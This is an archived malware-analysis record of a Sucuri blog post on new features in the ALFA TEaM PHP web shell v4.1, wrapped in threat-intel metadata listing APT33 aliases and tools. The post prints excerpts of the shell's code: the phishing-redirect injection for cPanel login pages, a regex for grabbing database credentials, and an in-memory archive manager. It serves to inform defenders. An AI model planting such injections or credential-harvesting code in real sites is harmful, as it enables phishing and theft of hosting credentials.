{
    "id": "3aa80bdd-c925-4e7c-a0dc-46fb242d2f95",
    "created_at": "2023-01-12T15:04:02.079372Z",
    "updated_at": "2025-03-27T02:16:30.18932Z",
    "deleted_at": null,
    "sha1_hash": "97df00bb5e7e644b3936967b12bcdeaacc622aa8",
    "title": "2020-11-05 - ALFA TEaM Shell ~ v4.1-Tesla- A Feature Update Analysis",
    "authors": "",
    "file_creation_date": "2022-05-28T05:11:45Z",
    "file_modification_date": "2022-05-28T05:11:45Z",
    "file_size": 1939088,
    "plain_text": "# Sucuri Blog\n\n**[blog.sucuri.net/2020/11/alfa-team-shell-v4-1-tesla-a-feature-update-analysis.html](https://blog.sucuri.net/2020/11/alfa-team-shell-v4-1-tesla-a-feature-update-analysis.html)**\n\nLuke Leal November 5, 2020\n\nWe’ve seen a wider variety of PHP web shells being used by attackers this year — including\na number of shells that have been significantly updated in an attempt to “improve” them.\n\nDepending on the scope of changes and feature enhancements that are added to an existing\nweb shell’s source code, these updates can be tedious and time consuming for bad actors.\nFor this reason, it’s common to see code for web shells reused among different, unaffiliated\nattackers.\n\n\n-----\n\nAn update notice for users still on v3, a now deprecated version of Alfa Shell.\n\n## ALFA TEaM Shell ~ v4.1-Tesla\n\n\n-----\n\nALFA TEaM Shell ~ v4.1-Tesla, released on Monday, September 14, 2020\nOne group that has released a new version of their PHP web shell is ALFA TEaM, a\nsuspected Iranian group that creates web malware like ALFA TEaM **Shell, which in the past**\nhas been used by threat actors like APT 33 who have targeted energy and aerospace\n[industries in the past. If you are interested, a detailed analysis on group APT 33’s tactics has](https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html)\nbeen documented by FireEye.\n\nWebsite owners may begin to wonder why they would find the same PHP shell, ALFA TEaM\n**Shell, on their website that has nothing to do with the industries targeted by threat actors**\nusing this malware?\n\nThe answer lies in the fact that attackers often need a large amount of distributed resources\nthat help facilitate malware or phishing delivery to their desired target. This could range from\nresources like “aged” websites that aren’t blacklisted, clean IP addresses from various\nproviders and geographical locations, known email accounts, or anything else that may give\ncredibility to their campaign.\n\nFor example, assets that help an attacker successfully deliver their malware payload via\nemail are resources like an aged email account, a SMTP server not operating on a\nblacklisted IP address, and similar resources. Without these resources their malicious email\nhas a much lower chance of ever reaching the inbox of a victim.\n\n\n-----\n\nAs it turns out, it s simply less effort for attackers to compromise other people s websites\nrather than spend time and money creating an elaborate network of aged websites located\naround the world.\n\nFrom the attacker’s perspective, all it takes is one or two blacklistings for a website and all of\ntheir hard work in acquiring the domain, setting up scraped content, and waiting, would be\nwasted.\n\nIf they don’t have to create, maintain, and age a domain and can instead gain unauthorized\naccess to a vulnerable third party website, it’s much more efficient for them.\n\n## New Features\n\nThe number of offered features make this a sort of an “all-in-one” web shell\nThe ALFA-TEaM shell contains an enormous number of features, so today I will focus\nprimarily on new or updated features for the latest version v4.1.\n\nWhen comparing v4.1’s PHP code, we can see the following new features, which are not\npresent in v3 of the web shell:\n```\n'dumper'  ➠  'Database Dumper',\n'coldumper'  ➠  'Column Dumper',\n'deziper'  ➠  'DeCompressor',\n'fakepage'  ➠  'Fake Page',\n'config_grabber'  ➠  'Config Grabber',\n'archive_manager'  ➠  'Archive Manager',\n\n```\nThe first three are just variations of existing features (e.g coldumper) and relatively common\namong multi-featured PHP web shells.\n\nLet’s focus on the behavior of the last three features: fakepage, config_grabber, and\n**archive_manager.**\n\n## Fake Page\n\nIn my opinion, fakepage is of the most interesting new features added to v4.1. It allows the\nattacker to create an on-the-fly phishing page for the two most common hosting control\npanels: cPanel and DirectAdmin.\n\n\n-----\n\nAs demonstrated above, there are a few parameters that the attacker can input when setting\nup the fake control panel page from the web shell. I’ve explained them in more detail below\nto help you understand what is going on here.\n\n**_Panel: cPanel_**\n\nThis parameter allows the attacker to define whether they will target either a cPanel or\n**DirectAdmin environment.**\n\n**_Clone page: hxxps://[redacted].com:2083_**\n\nThis variable defines the cPanel or DirectAdmin URL, allowing the fake page (phishing page)\nto be generated from the URL’s HTML source code. This is similar to copy/paste functions\nwhen using View Source in a browser, but with additional code used to capture the login\ndata.\n\n**_Fake page root:_** **_/var/www/html/wordpress/wp-includes/SimpleCake/_**\n\n\n-----\n\nThis parameter defines the directory on the compromised web server where the phishing\nfiles will be hosted.\n\n**_Inject to: /var/www/html/wordpress/index.php_**\n\nThis defines which file path the injected contents will be using, ultimately redirecting users to\nthe fake page parameters when certain conditions are met.\n\nFor example, here’s an outline of the behavior observed if a victim’s requested URL contains\n‘:2083‘, which is the default port for cPanel HTTPS connections.\n\nHere is a sample of the code injection which has been placed at the top of the Inject to: file\n(./index.php):\n```\nif(isset($_GET[\":2083\"])&&(int)$_COOKIE[\"alfa_fakepage_counter48232\"]<3)\n{include(\"/var/www/html/wordpress/wp-includes/SimpleCake/index.php\");exit;}\n\n```\nThis injection won’t do anything unless both defined conditions are met:\n\n1.\n\n1. Victim’s requested URL contains “:2083”\n2. Victim’s HTTP request contains a cookie starting with alfa_fakepage_counter\n\n**_Bind on: /var/www/html/wordpress/wp-login.php_**\n\nThis variable defines the file that will be inaccessible or “blocked” by the created phishing\npage.\n\nFor example, when binded to wp-login.php the victim won’t be able to access the website’s\n**wp-admin interface until they have attempted multiple login attempts on the phishing page.**\nAn incremental cookie stores these attempts and uses it to control access to the interface:\n**alfa_fakepage_counter48232 + 1.**\n\nHere is a sample of a code injection which has been placed at the top of the Bind on: file\n(./wp-login.php):\n```\nif((int)$_COOKIE[\"alfa_fakepage_counter48232\"]<3){header(\"Location:\nhxxp://localhost/wordpress/?:2083\");exit;}\n\n```\nNote the URL used for the redirection, which includes the condition required to load the\nphishing page. That condition is simply that the URL contains “:2083”.\n\n**_Count of Invalid Login: 3_**\n\nThis parameter defines the number of login attempts required before the victim can proceed\npast the control panel phishing page (fake page).\n\n\n-----\n\nUntil the victim exceeds this number of defined invalid login attempts, they won t be able to\naccess the wp-admin interface for their website.\n\n**_Log To: /var/www/html/wordpress/logs.txt_**\n\nThis variable defines the TXT file that will store any phished data. Using a TXT format allows\nfor quick downloads from remote locations and is especially useful if the attacker’s access to\nthe backdoor is lost for whatever reason.\n\nTo summarize, the fakepage feature essentially allows for targeted phishing attacks against\na compromised website’s hosting control panel. If successful, the attacker’s privileges will be\nescalated and they will be able to log in to the control panel.\n\n## config_grabber\n\nThis feature is used to recursively search for configuration files. It uses two functions;\n**_alfaconfig_grabber for the display in the web shell and Alfa_ConfigGrabber for performing_**\nthe search.\n\nWhile in theory this could be a potentially helpful feature, these searches return many files\n(as seen above), including those that don’t contain any MySQL database user login\ninformation whatsoever. This is due to greedy search terms contained in the $pattern\nfunction, causing it to return a lot of unneeded results.\n\n\n-----\n\n```\n        function Alfa_ConfigGrabber($dir, $ext)\n        {\n          $pattern = \"#define[ ]{0,}\\([ ]{0,}(?:'|\\\")DB_HOST(?:'|\\\")[ ]\n{0,}|define[ ]{0,}\\([ ]{0,}(?:'|\\\")DB_HOSTNAME(?:'|\\\")[ ]{0,}|config\\\n[(?:'|\\\")MasterServer(?:'|\\\")\\]\\[(?:'|\\\")password(?:'|\\\")\\]|(?:'|\\\")database(?:'|\\\")[\n]{0,}=>[ ]{0,}(?:'|\\\")(.*?)(?:'|\\\")|(?:'|\\\")(mysql|database)(?:'|\\\")[ ]{0,}=>[ ]\n{0,}array|db_name|db_user|db_pass|db_server|db_host|dbhost|dbname|dbuser|dbpass|databa\n ]{0,}mysqli#i\";\n...\n\n## Archive Manager\n\n```\nThe Archive Manager feature allows the attacker to quickly unpack archive files (e.g .zip,\n[.tar.gz, .gz, etc) into the server’s memory by generating a Phar PHP resource. The attacker](https://www.php.net/manual/en/book.phar.php)\ncan then manage the contents as if they had unpacked the archive in a file manager, but it is\ninstead loaded into memory and doesn’t unpack to a directory.\n\n\n-----\n\n```\n        function alfaarchive_manager()\n        {\n          alfahead();\n          $file = $_POST['alfa2'];\n          if (!file_exists($file))\n          {\n            $file = $GLOBALS['cwd'];\n          }\n          $rand_id = rand(9999, 999999);\n          echo '<div class=header><center><p><div class=\"txtfont_header\">|\nArchive Manager |</div></p>';\n          echo '<form name=\"srch\"\nonSubmit=\"g(\\'archive_manager\\',null,null,this.file.value,null,null,\\'>>\\');return\nfalse;\" method=\\'post\\'>\n  <div class=\"txtfont\">\n  Archive file: <input size=\"50\" id=\"target\" type=\"text\" name=\"file\" value=\"' .\n$file . '\">\n  <input type=\"submit\" name=\"btn\" value=\" \"></div></form></center><br>';\n          if ($_POST['alfa5'] == '>>')\n          {\n            echo '<hr><div style=\"margin-left: 12px;\"\narchive_full=\"phar://' . $file . '\" archive_name=\"' . basename($file) . '\"\nid=\"archive_dir_' . $rand_id . '\" class=\"archive_dir_holder\"><span>PWD: </span><div\nclass=\"archive_pwd_holder\" style=\"display:inline-block\"><a>/</a></div></div>';\n            echo '<div style=\"padding: 10px;\" id=\"archive_base_' .\n$rand_id . '\">';\n            __alfa_open_archive_file($file, $rand_id);\n            echo '</div>';\n          }\n          echo '</div>';\n          alfafooter();\n        }\n\n## Conclusion\n\n```\n**ALFA TEaM Shell ~ v4.1-Tesla contains a lot of features useful to an attacker and is also**\npolished in terms of its interface. What is especially interesting is to observe the evolution of\nthe tool and see what features have been added with each new version. This also helps give\nsomeone insight into what is important to an attacker, not solely from a website owner’s\nperspective.\n\nWhile interesting, this is definitely not behavior that you’d want to have on your website. One\n[of the best ways to detect malicious activity from web shells is to use a server side scanner](https://sucuri.net/malware-detection-scanning/)\nand monitoring service to identify any indicators of compromise on your website.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-05 - ALFA TEaM Shell ~ v4.1-Tesla- A Feature Update Analysis.pdf"
    ],
    "report_names": [
        "2020-11-05 - ALFA TEaM Shell ~ v4.1-Tesla- A Feature Update Analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "b23e717c-0b27-47e0-b3c8-4defe6dd857f",
            "created_at": "2023-01-06T13:46:38.367369Z",
            "updated_at": "2025-03-27T02:00:02.815758Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "ATK35",
                "Peach Sandstorm",
                "TA451",
                "APT 33",
                "Elfin",
                "Refined Kitten",
                "MAGNALLIUM",
                "HOLMIUM",
                "COBALT TRINITY",
                "G0064"
            ],
            "source_name": "MISPGALAXY:APT33",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9fe49a5b-f3e6-4fbf-99a1-db15dad460c3",
            "created_at": "2024-05-01T02:03:08.045004Z",
            "updated_at": "2025-03-27T02:05:17.325038Z",
            "deleted_at": null,
            "main_name": "COBALT TRINITY",
            "aliases": [
                "Elfin ",
                "HOLMIUM ",
                "MAGNALIUM ",
                "Peach Sandstorm ",
                "Refined Kitten ",
                "TA451 ",
                "APT33 "
            ],
            "source_name": "Secureworks:COBALT TRINITY",
            "tools": [
                " Cadlotcorg",
                " Dello RAT",
                " Imminent Monitor",
                " KDALogger",
                " Koadic",
                " NanoCore",
                " NetWire",
                " POWERTON",
                " PoshC2",
                " Poylog",
                " PupyRAT",
                " Schoolbag",
                "AutoCore"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e5ff825b-0456-4013-b90a-971b93def74a",
            "created_at": "2022-10-25T15:50:23.824058Z",
            "updated_at": "2025-03-27T02:00:55.553346Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "APT33",
                "HOLMIUM",
                "Elfin",
                "Peach Sandstorm"
            ],
            "source_name": "MITRE:APT33",
            "tools": [
                "PowerSploit",
                "AutoIt backdoor",
                "PoshC2",
                "Mimikatz",
                "NanoCore",
                "DEADWOOD",
                "StoneDrill",
                "POWERTON",
                "LaZagne",
                "TURNEDUP",
                "NETWIRE",
                "Pupy",
                "ftp",
                "Shamoon"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b938e2e3-3d1b-4b35-a031-ddf25b912557",
            "created_at": "2022-10-25T16:07:23.35582Z",
            "updated_at": "2025-03-27T02:02:09.750954Z",
            "deleted_at": null,
            "main_name": "APT 33",
            "aliases": [
                "APT 33",
                "ATK 35",
                "Cobalt Trinity",
                "Curious Serpens",
                "Elfin",
                "Holmium",
                "Magnallium",
                "Peach Sandstorm",
                "Refined Kitten",
                "TA451",
                "Yellow Orc"
            ],
            "source_name": "ETDA:APT 33",
            "tools": [
                "Atros2.CKPN",
                "AutoIt backdoor",
                "Breut",
                "CinaRAT",
                "DROPSHOT",
                "DarkComet",
                "DarkKomet",
                "DistTrack",
                "EmPyre",
                "EmpireProject",
                "FYNLOS",
                "FalseFont",
                "Filerase",
                "Fynloski",
                "JuicyPotato",
                "Krademok",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "Mimikatz",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "NetWeird",
                "NetWire",
                "NetWire RAT",
                "NetWire RC",
                "NetWired RC",
                "Notestuk",
                "POWERTON",
                "PoshC2",
                "PowerBand",
                "PowerShell Empire",
                "PowerSploit",
                "PsList",
                "Pupy",
                "PupyRAT",
                "Quasar RAT",
                "QuasarRAT",
                "Recam",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "SHAPESHIFT",
                "Shamoon",
                "Socmer",
                "StoneDrill",
                "TURNEDUP",
                "Tickler",
                "Yggdrasil",
                "Zurten",
                "klovbot",
                "pupy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535842,
    "ts_updated_at": 1743041790,
    "ts_creation_date": 1653714705,
    "ts_modification_date": 1653714705,
    "files": {
        "pdf": "https://archive.orkl.eu/97df00bb5e7e644b3936967b12bcdeaacc622aa8.pdf",
        "text": "https://archive.orkl.eu/97df00bb5e7e644b3936967b12bcdeaacc622aa8.txt",
        "img": "https://archive.orkl.eu/97df00bb5e7e644b3936967b12bcdeaacc622aa8.jpg"
    }
}